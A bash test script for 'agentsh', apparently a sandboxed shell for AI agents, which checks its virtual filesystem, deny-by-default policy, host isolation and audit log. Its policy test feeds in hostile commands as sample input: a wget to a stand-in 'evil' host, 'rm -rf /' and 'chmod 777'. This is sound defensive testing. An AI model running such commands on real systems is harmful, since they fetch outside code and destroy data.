#!/bin/bash
#
# run_tests.sh - unit-ish tests for the agentsh sandbox.
#
# Drives ./agentsh over stdin scripts and checks:
#   1. virtual filesystem behavior (mkdir/ls/cd/pwd/write/cat/tree/rm)
#   2. deny-by-default policy (disallowed command -> NOT ALLOWED!)
#   3. the sandbox never touches the host filesystem
#
# Exits non-zero on the first failure.

set -u
cd "$(dirname "$0")/.." || exit 1

if [ ! -x ./agentsh ]; then
	echo "agentsh not built; run 'make' first"
	exit 1
fi

PASS=0
FAIL=0

check() {
	# check <description> <expected substring> <actual output>
	local desc=$1 expected=$2 actual=$3
	if echo "$actual" | grep -qF "$expected"; then
		PASS=$((PASS + 1))
		echo "  PASS: $desc"
	else
		FAIL=$((FAIL + 1))
		echo "  FAIL: $desc"
		echo "        expected to find: $expected"
		echo "        in output:"
		echo "$actual" | sed 's/^/          /'
	fi
}

rm -rf audit queryResults

echo "== virtual filesystem =="
OUT=$(printf 'mkdir /projects\nmkdir /projects/demo\nls /projects\npwd\ncd /projects/demo\npwd\nexit\n' | ./agentsh tester 2>/dev/null)
check "mkdir creates nested dirs" "MKDIR SUCCESS: node /projects/demo" "$OUT"
check "ls lists children"         "demo/"                              "$OUT"
check "pwd after cd"              "/projects/demo"                     "$OUT"

echo "== files: write / cat / grep =="
OUT=$(printf 'touch /notes.txt\nwrite /notes.txt hello sandbox world\ncat /notes.txt\ngrep sandbox /notes.txt\nexit\n' | ./agentsh tester 2>/dev/null)
check "cat returns written text"  "hello sandbox world" "$OUT"
check "grep matches line"         "hello sandbox world" "$OUT"

echo "== deny-by-default policy =="
OUT=$(printf 'wget http://evil\nrm -rf /\nchmod 777 x\nexit\n' | ./agentsh tester 2>/dev/null)
check "disallowed command denied" "NOT ALLOWED!" "$OUT"

echo "== host isolation =="
# A VFS mkdir must NOT create a real directory on the host.
rm -rf ./__host_probe__
printf 'mkdir __host_probe__\nexit\n' | ./agentsh tester >/dev/null 2>&1
if [ -e ./__host_probe__ ]; then
	echo "  FAIL: VFS mkdir leaked to the host filesystem"
	FAIL=$((FAIL + 1))
	rm -rf ./__host_probe__
else
	echo "  PASS: VFS mkdir stayed in-memory (no host directory created)"
	PASS=$((PASS + 1))
fi

echo "== audit trail =="
check "audit ALLOW recorded" "ALLOW" "$(cat audit/tester.log 2>/dev/null)"
check "audit DENY recorded"  "DENY"  "$(cat audit/tester.log 2>/dev/null)"

echo
echo "Passed: $PASS  Failed: $FAIL"
[ "$FAIL" -eq 0 ]
